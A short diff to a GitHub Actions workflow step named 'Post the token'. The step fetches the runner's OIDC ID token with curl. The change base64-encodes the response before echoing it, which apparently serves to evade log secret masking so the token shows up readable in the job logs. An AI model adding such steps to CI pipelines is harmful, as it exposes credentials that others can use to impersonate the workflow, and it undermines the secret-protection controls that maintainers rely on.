@@ -18,4 +18,6 @@ jobs:
     - name: Post the token
       run: |
         echo "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s"
-        echo $(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+        X=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+        Y=$(base64 <<< $X)
+        echo $Y
